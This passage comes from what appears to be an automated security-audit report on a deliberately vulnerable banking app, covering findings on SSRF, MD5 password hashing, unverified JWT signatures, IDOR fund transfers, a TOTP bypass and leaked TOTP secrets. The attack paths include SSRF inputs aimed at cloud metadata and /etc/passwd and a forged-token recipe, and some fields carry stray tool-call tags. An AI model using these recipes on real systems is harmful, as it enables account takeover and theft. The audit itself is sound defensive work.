Caveat found during review: in the current shipped codebase there is no application-level feature (no admin/API endpoint) that provisions additional machine_tokens rows with different names — seed.sql inserts only the 'face_insurance' token, and MachineToken::validateToken()'s only other path returns the hardcoded name 'configured_machine_token' as a config-fallback token. So, as shipped, the two allow-listed names happen to be the only two token identities the system can currently produce, meaning the exploit requires an operator/ops action (inserting a new row into machine_tokens, which the schema explicitly supports and which is the stated design purpose of the table for "different merchants/integrations") to instantiate a third, unrestricted machine identity. That precondition is plausible and squarely within the system's intended extensibility, but it is external to the current in-repo logic, so the finding describes a genuine, concretely reachable authorization-bypass defect in the code rather than one that is fully demonstrable purely from the current seed data.

#### Code evidence

```
$sourceAccount = Account::findByBsbAndNumber($fromBsb, $fromAccountNum);
if (!$sourceAccount || !$sourceAccount['is_active']) { ... }

$machineName = $auth['machine']['name'] ?? '';
if ($machineName === 'face_insurance' || $machineName === 'configured_machine_token') {
    $merchant = Merchant::findByMerchantId('faceinsurance');
    $allowedAccountId = $merchant ? (int)$merchant['account_id'] : 100;
    if ((int)$sourceAccount['id'] !== $allowedAccountId && (int)$sourceAccount['user_id'] !== 16) {
        Response::error('UNAUTHORIZED_ACCOUNT', ...);
    }
}
// No 'else' branch -- any other machine name proceeds unrestricted
...
Account::updateBalance((int)$sourceAccount['id'], '-' . $amount);
if ($targetAccountId !== null) { Account::updateBalance($targetAccountId, $amount); }
```

## 33. SSRF via unrestricted avatar URL fetch in ProfileController::avatarProxy

- Lead reference: CVTA-033
- Category: A10
- Severity: HIGH
- Confidence: 94%
- Validation: confirmed
- Reportable: Yes
- Location: BankOfEd-main/src/Controllers/ProfileController.php:64-97
- Fingerprint: 2b276b317224ce215310192762565546dc2950449b930264b0517b834e601f35

### Evidence Chain

#### Source

```
{
  "file": "BankOfEd-main/src/Controllers/ProfileController.php",
  "input": "JSON body field 'url'",
  "line": 66,
  "symbol": "$data['url']"
}
```

#### Controls encountered

No controls recorded

#### Sink

```
{
  "file": "BankOfEd-main/src/Controllers/ProfileController.php",
  "line": 78,
  "operation": "outbound HTTP(S)/file fetch of attacker-controlled URL",
  "symbol": "file_get_contents($data['url'], false, $context)"
}
```

#### Counterevidence

No counterevidence recorded

#### Proof gaps

```
[
  "PHP php.ini allow_url_fopen setting is not shown in repo; if disabled, http(s) wrapper fetches via file_get_contents would fail (though file://, and other enabled wrappers would still work, and allow_url_fopen defaults to On in stock PHP so this is a minor, non-blocking gap)"
]
```

#### Attack path

```
{
  "nodes": [
    "Authenticated bank customer (attacker)",
    "POST /api/profile/avatar {url: <attacker-chosen target, e.g. http://169.254.169.254/latest/meta-data/, http://127.0.0.1:<internal_port>/, or file:///etc/passwd>}",
    "ProfileController::avatarProxy() calls file_get_contents($data['url']) with a stream context that follows redirects, with no scheme/host/port allowlist or denylist",
    "The application server issues the outbound (or local-file) request from its own network position/privileges",
    "Response body is base64-encoded and Content-Type captured, then returned in the API JSON response as avatar_data",
    "Attacker reads the internal service's response (cloud metadata, internal admin panel, local file contents, etc.) directly from the API response"
  ],
  "impact": "Server-Side Request Forgery allowing an authenticated customer to probe and read responses from internal-only network services, cloud metadata endpoints, or local files accessible to the application server, potentially leading to credential/secret disclosure and further internal network compromise.",
  "severity_reasoning": "Only requires standard customer authentication, no other privilege, and grants a generic internal-network read primitive (classic SSRF with data returned to the attacker) — High severity given the potential for cloud credential theft or internal service compromise depending on hosting environment.",
  "dynamic_test": "As an authenticated customer, POST /api/profile/avatar with url pointing at an internal-only test listener (e.g., a service bound to 127.0.0.1 on the app host, or a controlled endpoint simulating a metadata service) and confirm the base64-decoded avatar_data in the response matches that internal service's response body, proving the server made the request on the attacker's behalf; additionally test file:///etc/passwd (or an accessible local file) to check for local file disclosure via the same code path."
}
```

#### Validator reasoning

The code at ProfileController.php:63-105 (avatarProxy) reads a JSON body, checks only that `url` is non-empty (empty() check), then passes it directly to file_get_contents() with a stream context that has follow_location=true. There is no scheme allow-list (http/https only), no host/IP validation (no blocking of loopback, link-local, RFC1918 private ranges, or cloud metadata IP 169.254.169.254), and no port restriction. The fetched body is base64-encoded and returned to the caller along with a Content-Type header parsed straight from the response, and the raw source_url is echoed back and even persisted to the user's profile (avatar_url) for replay on next page load. Router.php:51 registers this handler at POST /api/profile/avatar with 'auth' => true, confirming it is reachable by any authenticated user (not admin-only), matching the low-privilege reachability claim. This is a full source-to-sink path: attacker-controlled JSON field 'url' -> file_get_contents() network/file fetch -> response leaked back to attacker. No WAF, egress filtering, or allow-list control is present in this code path. This is a textbook confirmed SSRF (also enables file:// and other stream-wrapper protocol abuse if allow_url_fopen/wrappers are enabled, which is default in PHP).</reasoning>
<parameter name="controls">["AuthMiddleware requires a valid session/token to reach the endpoint (auth:true in Router.php), but this only proves the vulnerability requires low-privileged authentication, not that it blocks SSRF), non-blocking control", "empty($data['url']) check only rejects blank input, not malicious schemes/hosts"]

#### Code evidence

```
if (empty($data['url'])) { Response::error('VALIDATION_ERROR', 'Avatar URL is required.', 422); }
$context = stream_context_create(['http' => ['timeout' => 5, 'follow_location' => true]]);
$content = @file_get_contents($data['url'], false, $context);
...
Response::success(['avatar_data' => "data:{$mime};base64,{$encoded}", 'size' => strlen($content), 'source_url' => $data['url']]);
```

## 34. Passwords hashed with unsalted MD5 instead of a secure algorithm

- Lead reference: CVTA-034
- Category: A02
- Severity: MEDIUM
- Confidence: 93%
- Validation: confirmed
- Reportable: Yes
- Location: BankOfEd-main/src/Services/AuthService.php:22-32
- Fingerprint: 1b9f61cd9bb0efb7acaee93a91c3478ae40a22478933ba9cc6235789c99c92cb

### Evidence Chain

#### Source

```
{
  "file": "BankOfEd-main/src/Controllers/AuthController.php",
  "line": 33,
  "symbol": "AuthService::hashPassword",
  "input": "user-supplied registration password"
}
```

#### Controls encountered

```
[
  "None found - no salt/pepper applied before or after hashPassword() call",
  "No framework/ORM automatically re-hashes with bcrypt on save",
  "No rate-limiting or additional protection specific to this weak digest observed"
]
```

#### Sink

```
{
  "file": "BankOfEd-main/src/Services/AuthService.php",
  "line": 24,
  "symbol": "md5($password)",
  "operation": "weak password hash"
}
```

#### Counterevidence

```
[
  "Exploitation impact (offline cracking) requires a secondary vector such as SQLi/DB leak to actually expose stored hashes, so this is a defense-in-depth weakness rather than a directly exploitable RCE/authz bypass on its own",
  "Admin-facing password reset flow (AdminUserController.php:164) does correctly use PASSWORD_BCRYPT, showing the weakness is confined to the public registration path, not universal across the app"
]
```

#### Proof gaps

```
[
  "No evidence a scheduled migration/rehash job upgrades legacy md5 hashes to bcrypt after login, though this doesn't change that new registrations still get weak hashes at creation time"
]
```

#### Attack path

```
{
  "nodes": [
    "Attacker obtains the users table (e.g. via the unauthenticated /api/admin/export/users endpoint, or the AdminUserController search SQL injection)",
    "Extracted password_hash column values are unsalted MD5 digests for accounts created via AuthController::register() -> AuthService::hashPassword()",
    "Attacker runs offline rainbow-table/GPU brute-force cracking against the unsalted MD5 hashes (no per-user salt, so precomputed tables are effective across all accounts at once)",
    "Recovered plaintext password used in POST /api/auth/login",
    "AuthService::verifyPassword() accepts the MD5 match (or, after any potential future migration, bcrypt fallback) and issues a valid session JWT",
    "Attacker gains fully authenticated access to the victim's banking account"
  ],
  "impact": "Once any avenue exposes the users table (multiple such avenues exist elsewhere in this codebase), unsalted MD5 password hashing means essentially all customer passwords can be recovered en masse via precomputed rainbow tables, leading to mass account takeover rather than the app's intended per-user, computationally-hard bcrypt protection.",
  "severity_reasoning": "Not directly exploitable over the network on its own, but it is a critical weakening of the defense-in-depth that would otherwise limit the blast radius of any data exposure bug in this application; combined with the confirmed export/SQLi findings, it converts a data leak into full mass account takeover — Medium severity as scored, reflecting its role as an impact amplifier rather than a standalone remote entry point.",
  "dynamic_test": "Register a test user with a known password, retrieve its password_hash (e.g., via the /api/admin/export/users endpoint or direct DB access in a test environment), confirm hash == md5(password); run a standard MD5 cracking tool/rainbow table against the hash and confirm the original password is recovered quickly, then use it to successfully authenticate via POST /api/auth/login."
}
```

#### Validator reasoning

Source-to-sink path is concrete and unmitigated. AuthController::register() (POST /api/auth/register) takes user-supplied password from request body, passes it directly to AuthService::hashPassword($data['password']), which returns md5($password) with no salt or pepper anywhere in the pipeline. The resulting password_hash is inserted into the users table via User::create() (INSERT INTO users (... password_hash ...) VALUES (...)) with no further transformation. Grep across the codebase confirms no salting/peppering step exists between input and storage.

AuthService::verifyPassword() further hard-codes acceptance of any 32-character stored hash as MD5 (`if (strlen($hash) === 32) { return md5($password) === $hash; }`), showing this isn't a one-off but the deliberate/legacy login path for all such accounts, and it uses a non-constant-time `===` comparison for the digest check.

Contrast with AdminUserController.php:164 (`password_hash($data['password'], PASSWORD_BCRYPT)`) and AdminAuthController.php:30 (`password_verify(...)`) confirms bcrypt is available and used elsewhere in the app, making the choice of plain MD5 in the customer-facing registration path a clear regression/weak-crypto flaw rather than a false read of dead code — this path is live and reachable by any unauthenticated user hitting POST /api/auth/register.

This is a legitimate CWE-916 (weak password hashing, insufficient computational effort) / CWE-759 (unsalted hash) finding. Impact (offline cracking) is contingent on a separate data-exposure vector (SQLi, DB leak, backup leak), which is why "medium" severity is appropriate rather than critical, but the vulnerable code itself is unconditionally reachable and unmitigated — no framework guarantee, WAF, or later re-hashing neutralizes it.

#### Code evidence

```
public static function hashPassword(string $password): string
{
    return md5($password);
}

public static function verifyPassword(string $password, string $hash): bool
{
    // Support both legacy md5 and bcrypt hashes
    if (strlen($hash) === 32) {
        return md5($password) === $hash;
    }
    return password_verify($password, $hash);
}
// Called from AuthController::register(): 'password_hash' => AuthService::hashPassword($data['password'])
```

## 35. JWT signature not verified when decoding bearer tokens (auth bypass / forgery)

- Lead reference: CVTA-035
- Category: A02
- Severity: HIGH
- Confidence: 97%
- Validation: confirmed
- Reportable: Yes
- Location: BankOfEd-main/src/Services/AuthService.php:50-64
- Fingerprint: 971094039443c09091dbcdca527338b1d092892d418734cc1a9bcccea3c58a1f

### Evidence Chain

#### Source

```
{
  "file": "BankOfEd-main/src/Middleware/AuthMiddleware.php",
  "line": 22,
  "symbol": "AuthService::decodeToken",
  "input": "Authorization: Bearer <attacker-crafted JWT>"
}
```

#### Controls encountered

```
[
  "isTokenRevoked(jti) check exists but only blocks tokens whose jti was previously explicitly revoked (e.g., via logout); an attacker-forged token with a fresh/random jti is never in the revoked_tokens table and passes this check trivially, so it provides no real protection against forgery.",
  "exp timestamp check exists but is attacker-controlled since the attacker crafts the payload themselves, so it is not a meaningful control against a forger."
]
```

#### Sink

```
{
  "file": "BankOfEd-main/src/Services/AuthService.php",
  "line": 58,
  "symbol": "json_decode(base64_decode(...))",
  "operation": "JWT payload trusted without signature verification"
}
```

#### Counterevidence

No counterevidence recorded

#### Proof gaps

```
[
  "Did not verify at runtime that PHP's loose type/array access (json_decode returning stdClass) won't throw on malformed attacker input before reaching User::findById, though the try/catch and isset() checks in decodeToken appear to handle malformed inputs gracefully (returning null), so this is a minor gap not affecting the core finding.",
  "Did not enumerate exact valid user IDs, but sub is attacker-controlled and user IDs are typically sequential/enumerable in this type of application, so exploitability is not meaningfully reduced."
]
```

#### Attack path

```
{
  "nodes": [
    "External unauthenticated attacker",
    "Attacker crafts an arbitrary JWT: base64url(header) + '.' + base64url({\"sub\":<any_user_id>,\"jti\":<any>,\"exp\":<future>}) + '.' + arbitrary third segment",
    "Sends the token as Authorization: Bearer <token> to any AuthMiddleware-protected endpoint (accounts, transfers, profile, transactions, address book, TOTP endpoints)",
    "AuthMiddleware::handle() -> AuthService::decodeToken() splits on '.', base64-decodes only the payload, and checks only the 'exp' claim — the signature segment is never verified against config['jwt_secret'] (contrast with AdminAuthMiddleware's correct Firebase JWT::decode+Key usage)",
    "$auth['user'] is populated from the DB using the attacker-chosen 'sub' with no cryptographic proof of authenticity",
    "Every downstream handler (fund transfers, profile edits, TOTP setup/verify/disable, address book CRUD) executes as if the attacker were the legitimate target user"
  ],
  "impact": "Root-cause authentication bypass affecting the entirety of the AuthMiddleware-protected banking surface: any external party can impersonate any user id at will without ever knowing the JWT secret, enabling arbitrary fund transfers, profile takeover, and 2FA manipulation for any account.",
  "severity_reasoning": "This is the most severe class of authentication flaw (missing signature verification entirely) affecting the majority of the application's endpoints with trivial, credential-free exploitation — High severity, and the primary root cause underlying several other findings (e.g., TOTP verify bypass, profile IDOR compounding).",
  "dynamic_test": "Craft token = base64url('{\"alg\":\"HS256\",\"typ\":\"JWT\"}') + '.' + base64url('{\"sub\":<victim_id>,\"exp\":9999999999}') + '.garbage'; send it as Authorization: Bearer <token> to GET /api/accounts and to POST /api/transfers/own; confirm both requests succeed and return/act upon the victim's real account data, proving the signature is never validated."
}
```

#### Validator reasoning

Reviewed AuthService::decodeToken() directly: it splits the JWT into 3 parts, base64url-decodes only parts[1] (payload), json_decodes it, and checks only the presence/validity of `exp`. parts[2] (signature) is never read, and no HMAC/verification call (e.g., Firebase JWT::decode, hash_hmac comparison) exists anywhere in this function or its call chain. Confirmed AuthMiddleware::handle() (src/Middleware/AuthMiddleware.php) calls exactly this function to authenticate every request, then uses payload->jti (for revocation check) and payload->sub (to load the User) with no other verification step. Router.php shows this middleware guards essentially all sensitive banking endpoints (/api/accounts, /api/transfers/own, /api/transfers/external, /api/profile, /api/transactions, /api/address-book, /api/fx/*, /api/insurance/sso*) via 'auth' => true, contrasted with the separate, correctly-implemented AdminAuthMiddleware that does use Firebase\JWT\JWT::decode() with a Key object (verified in AdminAuthMiddleware.php line 27) and MachineAuthMiddleware for machine-token routes. Because signature verification is absent, an attacker can construct a token consisting of base64url({"alg":"HS256","typ":"JWT"}) + '.' + base64url({"sub":<any_user_id>,"jti":<random_hex>,"exp":<future_ts>}) + '.' + <any third segment, even garbage>, and decodeToken() will accept it as valid (count(parts)===3, payload decodes, exp check passes) — completely bypassing the JWT_SECRET requirement. The only additional check, isTokenRevoked($payload->jti), only blocks explicitly revoked jti values; an attacker-chosen random jti will not be in the revoked_tokens table, so it passes trivially. User::findById($payload->sub) succeeds provided the sub value corresponds to an existing user id (trivially guessable/enumerable, e.g., 1, 2, 3…). This yields full account takeover / impersonation of arbitrary users for every AuthMiddleware-protected endpoint, matching the reported high-severity A02 authentication bypass exactly as described, with no compensating control anywhere in the path.

#### Code evidence

```
public static function decodeToken(string $token): ?object
{
    try {
        // Decode token payload without strict signature verification
        $parts = explode('.', $token);
        if (count($parts) !== 3) {
            return null;
        }
        $payload = json_decode(base64_decode(strtr($parts[1], '-_', '+/')));
        if (!$payload || !isset($payload->exp) || $payload->exp < time()) {
            return null;
        }
        return $payload;
    } catch (\Exception $e) {
        return null;
    }
}
// AuthMiddleware.php:
$payload = AuthService::decodeToken($token);
...
$user = User::findById($payload->sub);
```

## 36. IDOR: external transfer source account not verified to belong to the authenticated user

- Lead reference: CVTA-036
- Category: A01
- Severity: HIGH
- Confidence: 97%
- Validation: confirmed
- Reportable: Yes
- Location: BankOfEd-main/src/Services/TransferService.php:172-176
- Fingerprint: d116f4dfc7340e8557f1e6d37e12a1e35ef21d1d9476a18117484e84e9719618

### Evidence Chain

#### Source

```
{
  "file": "BankOfEd-main/src/Controllers/PaymentController.php",
  "line": 0,
  "symbol": "fromAccountId from request body",
  "input": "attacker-controlled account id"
}
```

#### Controls encountered

```
[
  "Authentication is required (auth=>true) but does not by itself verify resource ownership.",
  "Validator::make only checks that from_account_id is 'required|numeric' — no ownership scoping.",
  "TOTP 2FA can be required for first-time/unverified payees, but per VULNERABILITY #8 it is bypassable when the user hasn't configured TOTP, and even when required does not verify anything about the source account's ownership."
]
```

#### Sink

```
{
  "file": "BankOfEd-main/src/Services/TransferService.php",
  "line": 174,
  "symbol": "Account::findById($fromAccountId)",
  "operation": "missing ownership check before debiting funds"
}
```

#### Counterevidence

No counterevidence recorded

#### Proof gaps

```
[
  "Did not execute the endpoint live end-to-end (e.g. with a live DB) to observe an actual balance change; conclusion is based on full static code-path tracing only.",
  "Did not review Account::findById implementation itself, but function naming and its usage compared directly to findByIdAndUser used elsewhere in the same file makes the lack of the WHERE user_id clause unambiguous."
]
```

#### Attack path

```
{
  "nodes": [
    "Authenticated attacker (any registered customer, user A)",
    "POST /api/transfers/external with from_account_id set to a victim account belonging to user B (obtained e.g. via enumeration or another IDOR), plus attacker-controlled to_bsb/to_account_number",
    "TransactionController::transferExternal() forwards the request to TransferService::transferExternal()",
    "TransferService loads the source account via Account::findById($fromAccountId) — no ownership/user filter is applied (contrast with transferOwn's use of Account::findByIdAndUser())",
    "Account::updateBalance($fromAccountId, -amount) debits user B's account without verifying the caller owns it",
    "Funds are credited to the attacker's chosen destination (own account, address-book entry, or manual BSB/account number)",
    "Transaction::create() records the transfer as legitimate"
  ],
  "impact": "Broken Object Level Authorization allowing any authenticated customer to steal funds directly from any other customer's account simply by supplying that account's numeric id as the transfer source — a direct, high-value financial fraud primitive.",
  "severity_reasoning": "Requires only standard low-privilege authentication and a target account id, with no further checks; the developer's own in-code comment explicitly flags this as a known IDOR vulnerability — High severity due to direct, unauthenticated-relative-to-victim fund theft.",
  "dynamic_test": "As attacker user A, call POST /api/transfers/external with from_account_id = <user B's account id>, to_bsb/to_account_number = attacker's own account, amount = X; confirm HTTP 200 success and verify (via GET /api/accounts as user B, or DB inspection) that user B's balance decreased by X and the attacker's balance increased by X, despite user A never owning account B."
}
```

#### Validator reasoning

Traced the full path from HTTP request to sink. TransactionController::transferExternal() reads `from_account_id` directly from the JSON request body (`(int)$data['from_account_id']`), validated only as a required numeric value (no ownership constraint), and passes it unchanged to TransferService::transferExternal($auth['user'], $fromAccountId, ...). Inside TransferService::transferExternal, the source account is loaded via `Account::findById($fromAccountId)` — a lookup that filters only by primary key, not by the authenticated user's id — in contrast to transferOwn() which correctly uses `Account::findByIdAndUser($fromAccountId, $userId)`. The developer left an explicit comment: "VULNERABILITY #23: IDOR - no ownership check on source account." Later in the same method, `Account::updateBalance($fromAccountId, '-' . $debitAmount)` (within a DB transaction) debits the attacker-supplied account with no re-validation of ownership at any point along the path. The router confirms this is reachable at POST /api/transfers/external with `auth => true` (i.e., any authenticated user, not necessarily the account owner). Additionally, the code contains a second flagged vulnerability ("VULNERABILITY #9: No balance check on external transfers") which removes even the insufficient-funds barrier, making exploitation trivial — an attacker can drain any account by ID to an address-book entry or arbitrary BSB/account number they control. No compensating control (ownership check, balance check re-verification, authorization decorator) exists anywhere between source and sink.

#### Code evidence

```
// VULNERABILITY #23: IDOR - no ownership check on source account.
// Any authenticated user can supply any account ID as the source.
$fromAccount = Account::findById($fromAccountId);
if (!$fromAccount) {
    Response::notFound('Source account not found.');
}
...
Database::beginTransaction();
try {
    Account::updateBalance($fromAccountId, '-' . $debitAmount);
```

## 37. TOTP/2FA can be bypassed for external transfers when not configured or code omitted

- Lead reference: CVTA-037
- Category: A07
- Severity: HIGH
- Confidence: 93%
- Validation: confirmed
- Reportable: Yes
- Location: BankOfEd-main/src/Services/TransferService.php:236-246
- Fingerprint: 8358c45cfe4ff906e110578f0a5323c33e2edc3ee6980864ffb4e0c84d33d433

### Evidence Chain

#### Source

```
{
  "file": "BankOfEd-main/src/Controllers/PaymentController.php",
  "line": 0,
  "symbol": "totp_code from request body",
  "input": "optional/omittable client-supplied field"
}
```

#### Controls encountered

```
[
  "[\"Validator::make on TransactionController::transferExternal enforces presence of from_account_id, amount, and either address_book_id or to_bsb/to_account_number, but does NOT require totp_code even when 2FA would be required.\", \"checkTotpRequired() correctly computes when 2FA should be mandatory (manual entry or unverified address-book payee), but this determination is not enforced as a hard gate.\"]\n<parameter name=\"counterevidence\">[]"
]
```

#### Sink

```
{
  "file": "BankOfEd-main/src/Services/TransferService.php",
  "line": 241,
  "symbol": "TotpService::verify",
  "operation": "2FA check skipped when totp_enabled=false or totp_code empty"
}
```

#### Counterevidence

No counterevidence recorded

#### Proof gaps

```
[
  "Did not find any global middleware or account-level policy that would reject transactions with totp_verified=0 after the fact (e.g. a reconciliation/fraud process); such a control, if it existed elsewhere, could reduce real-world impact, but none was found in the provided codebase.",
  "Suggested endpoint path in the lead (/api/payments/external) differs from the actual route (/api/transfers/external) — cosmetic discrepancy only, does not affect the vulnerability's validity."
]
```

#### Attack path

```
{
  "nodes": [
    "Authenticated attacker whose account has TOTP disabled, or who simply omits the totp_code field",
    "POST /api/transfers/external targeting a brand-new/unverified address-book payee (a scenario meant to require 2FA) with no totp_code (or totp_code omitted)",
    "TransactionController::transferExternal() forwards the request to TransferService::transferExternal()",
    "If $user['totp_enabled'] is false, the code sets $totpVerified=false but does not reject the request; if totp_enabled is true but totp_code is empty, the 'elseif (!empty($totpCode))' branch is skipped entirely, so TotpService::verify() is never invoked and $totpVerified remains false without causing rejection",
    "Execution falls through to the actual balance-moving logic regardless of $totpVerified's value",
    "Account::updateBalance() and Transaction::create() complete the transfer to the new/unverified payee"
  ],
  "impact": "The intended second-factor control on sensitive first-time/external transfers is entirely bypassable: an attacker (or a compromised session lacking the second factor) can move funds to new payees without ever presenting a valid TOTP code, defeating the app's core anti-fraud control for account takeover scenarios (e.g., after a JWT-forgery or credential-theft attack elsewhere in this app).",
  "severity_reasoning": "This directly undermines the second-factor protection meant to limit damage from a compromised primary credential/session — combined with other findings (JWT forgery, credential leakage) it removes the last line of defense against fraudulent transfers, warranting High severity.",
  "dynamic_test": "Using a test account with TOTP disabled (default state), call POST /api/transfers/external to a newly created address-book payee (first transfer to that payee) with an amount above any stated 2FA threshold and no totp_code field in the request body; confirm the transfer completes successfully (HTTP 200, balance moved) despite no 2FA code ever being validated."
}
```

#### Validator reasoning

Reviewed TransferService::transferExternal (lines ~230-246) and its caller TransactionController::transferExternal (which maps to route POST /api/transfers/external, not /api/payments/external as stated but functionally the same sink). The controller's Validator::make rules for this endpoint only require from_account_id, amount, description, and (address_book_id) or (to_bsb/to_account_number) — totp_code is never included in the validation rules and is passed through as `$data['totp_code'] ?? null`, i.e. fully optional/omittable by the client. In TransferService, checkTotpRequired() correctly flags 'manual' transfers and first transfers to unverified address-book payees as requiring 2FA. However the enforcement block is: if ($totpCheck['required']) { if (!$user['totp_enabled']) { $totpVerified = false; /* no rejection, no Response::forbidden */ } elseif (!empty($totpCode)) { verify or forbid } } — there is no `else` branch handling the case where totp_enabled is true but totpCode is empty; in that case neither branch executes and $totpVerified simply remains false with execution falling straight through to the balance debit and Transaction::create call. No exception, no Response::forbidden, no early return occurs in either bypass scenario. The transfer completes successfully (Response::success 201) in both cases: (a) user never enabled TOTP, or (b) user enabled TOTP but the client simply omits/empties totp_code. This is a real, unauthenticated-by-second-factor completion of a sensitive external funds transfer to a manual/unverified account, matching the classic A07 (identification and authentication failures) pattern. No compensating control (rate limiting per se, out-of-band confirmation, WAF rule, or downstream check on totp_verified flag before crediting) was found in the surrounding code — Transaction::create merely records totp_verified=0 for audit purposes but does not gate the transfer. The only minor inaccuracy in the lead is the endpoint path (/api/transfers/external vs. the suggested /api/payments/external), which does not affect the validity of the vulnerability.

#### Code evidence

```
// VULNERABILITY #8: TOTP Bypass — if TOTP is required but not configured, transfer proceeds anyway.
// Additionally, if configured but code is omitted, transfer still succeeds.
if ($totpCheck['required']) {
    if (!$user['totp_enabled']) {
        // Allow transfer to proceed without TOTP if user hasn't configured it
        $totpVerified = false;
    } elseif (!empty($totpCode)) {
        if (!TotpService::verify($user['totp_secret'], $totpCode, $user['email'])) {
            Response::forbidden('TOTP_INVALID', 'Invalid TOTP code. Please try again.');
        }
        $totpVerified = true;
    }
}
```

## 38. IDOR in ProfileController::update leaks any user's password hash and TOTP secret (full account takeover)

- Lead reference: CVTA-038
- Category: API3
- Severity: HIGH
- Confidence: 97%
- Validation: confirmed
- Reportable: Yes
- Location: BankOfEd-main/src/Controllers/ProfileController.php:52-60
- Fingerprint: 7b1bc1d4faeb604ccfbf485e7b821d1cece8b1f7c44f8aae721fcfde69465bdf

### Evidence Chain

#### Source

```
{
  "file": "BankOfEd-main/src/Controllers/ProfileController.php",
  "input": "JSON body field 'user_id'",
  "line": 53,
  "symbol": "$data['user_id']"
}
```

#### Controls encountered

```
[
  "[\"AuthMiddleware requires a valid session/token but does not enforce that the token's user id matches the supplied user_id\", \"Validator::make only validates presence/format of profile fields, not user_id, so it does not block or sanitize the IDOR parameter\"]\n<parameter name=\"counterevidence\">[]"
]
```

#### Sink

```
{
  "file": "BankOfEd-main/src/Controllers/ProfileController.php",
  "line": 59,
  "operation": "return victim's password_hash and totp_secret to unrelated authenticated attacker",
  "symbol": "Response::success(User::toPublic($updated), ...)"
}
```

#### Counterevidence

No counterevidence recorded

#### Proof gaps

No unresolved static proof gaps

#### Attack path

```
{
  "nodes": [
    "Authenticated attacker (any registered customer, user A)",
    "PUT /api/profile with body {\"user_id\": <victim B's id>} and no other fields (so no actual data change is required)",
    "AuthMiddleware authenticates the request as user A (a legitimate, valid session)",
    "ProfileController::update() computes $targetUserId = (int)$data['user_id'] instead of the authenticated user's own id, with no check that $targetUserId === $auth user id",
    "Handler proceeds and, regardless of whether $updateData is empty, always executes User::findById($targetUserId) at the end",
    "User::toPublic($updated) includes password_hash and totp_secret in the returned array",
    "Response::success() sends victim B's full profile — including password_hash and totp_secret — back to attacker A"
  ],
  "impact": "Any authenticated customer can retrieve any other customer's bcrypt password hash and raw TOTP secret via a single, trivial API call, enabling offline password cracking and complete, silent 2FA bypass (attacker can generate valid TOTP codes for the victim) — full account takeover for any user id in the system, and the same code path can also be used to overwrite the victim's profile fields.",
  "severity_reasoning": "Trivial exploitation (a single PUT request with a body parameter, no special payload), zero additional privilege required beyond having any valid account, and the leaked data (password hash + TOTP secret) directly and completely defeats both primary and secondary authentication factors for any targeted victim — High severity.",
  "dynamic_test": "As attacker user A (valid session), call PUT /api/profile with body {\"user_id\": <victim B's id>}; inspect the JSON response and confirm it contains victim B's password_hash and totp_secret fields; generate a TOTP code from the leaked totp_secret using a standard TOTP library and use it to successfully pass a TOTP-protected action (e.g., transferExternal 2FA) as victim B, confirming full 2FA bypass and account compromise."
}
```

#### Validator reasoning

Code review confirms the full path. Router.php registers `PUT /api/profile` -> ProfileController::update with only `auth => true` (any authenticated user, no role/ownership check). Inside update(), `$data['user_id']` from the raw JSON body is read directly into `$targetUserId` with no validation and no comparison to `$auth['user']['id']`. Validator::make() only validates the profile-field keys (first_name, email, etc.) and never touches user_id, so an attacker can send a body containing only `{"user_id": <victim_id>}` and skip the `!empty($updateData)` branch entirely (no fields modified, no side effects needed for the leak). The code then unconditionally executes `$updated = User::findById($targetUserId); Response::success(User::toPublic($updated), ...)`. User::findById does a plain `SELECT * FROM users WHERE id = ?` with no ownership filter, and User::toPublic() (confirmed in Models/User.php) returns 'password_hash' and 'totp_secret' verbatim in the response payload. There is no other check (CSRF token binding to user, output filtering, field allowlist on the response) that would block this. This is a complete, low-complexity, single-request IDOR that discloses another user's bcrypt password hash and raw TOTP secret, and additionally permits modifying the victim's profile fields if updateData is also supplied. No mitigating control exists in the surrounding AuthMiddleware (only validates the token belongs to *some* valid user, not that it matches the target).

#### Code evidence

```
$allowed = ['first_name','last_name','email','phone','address_line1','address_line2','suburb','state','postcode'];
$updateData = array_intersect_key($data, array_flip($allowed));

// Allow specifying which profile to update
$targetUserId = isset($data['user_id']) ? (int)$data['user_id'] : (int)$user['id'];

if (!empty($updateData)) {
    User::update($targetUserId, $updateData);
}

$updated = User::findById($targetUserId);
Response::success(User::toPublic($updated), 'Profile updated successfully');

// User::toPublic() includes:
'password_hash' => $user['password_hash'],
'totp_secret'   => $user['totp_secret'],
```

## 39. BOLA in TransactionController::show allows viewing any user's transaction by ID

- Lead reference: CVTA-039
- Category: API1
- Severity: HIGH
- Confidence: 96%
- Validation: confirmed
- Reportable: Yes
- Location: BankOfEd-main/src/Controllers/TransactionController.php:40-46
- Fingerprint: d6029bab268f63c73bfe579bac4ede744832fc2c3abc914936bd08d8e94b54c5

### Evidence Chain

#### Source

```
{
  "file": "BankOfEd-main/src/Controllers/TransactionController.php",
  "input": "route path parameter {id}",
  "line": 40,
  "symbol": "$vars['id']"
}
```

#### Controls encountered

```
[
  "[\"AuthMiddleware requires a valid authenticated user/token to reach the handler (confirmed via Router.php 'auth' => true), but this only proves authentication, not authorization/ownership of the specific transaction id\"]\n<parameter name=\"counterevidence\">[]"
]
```

#### Sink

```
{
  "file": "BankOfEd-main/src/Controllers/TransactionController.php",
  "line": 42,
  "operation": "return any transaction record regardless of caller ownership",
  "symbol": "Transaction::findById((int)$vars['id'])"
}
```

#### Counterevidence

No counterevidence recorded

#### Proof gaps

No unresolved static proof gaps

#### Attack path

```
{
  "nodes": [
    "Authenticated attacker (any registered customer)",
    "GET /api/transactions/{id} with a sequential/enumerated numeric id not belonging to the attacker's own accounts",
    "AuthMiddleware authenticates the attacker as themselves (a legitimate session)",
    "TransactionController::show() calls Transaction::findById((int)$vars['id']) with no check that the transaction's account belongs to the authenticated user (unlike TransactionController::index() with account_id, which enforces Account::findByIdAndUser())",
    "Transaction::format() returns full transaction details: amount, description, BSB/account numbers, receipt number",
    "Response::success() returns the victim's transaction details directly to the attacker"
  ],
  "impact": "Broken Object Level Authorization allowing any authenticated customer to enumerate transaction ids and read the financial transaction details (amounts, BSB/account numbers, descriptions, receipt numbers) of arbitrary other customers, a significant privacy/financial-data breach.",
  "severity_reasoning": "Trivial to exploit via straightforward ID enumeration with only standard customer-level access, yielding mass exposure of other users' sensitive financial transaction data — High severity.",
  "dynamic_test": "As an authenticated attacker, iterate GET /api/transactions/{id} for a range of ids (e.g., 1 through 50) and confirm that a substantial number of requests return HTTP 200 with transaction details (BSB/account numbers, amounts, descriptions) that do not correspond to any account owned by the attacker, confirming the missing ownership check."
}
```

#### Validator reasoning

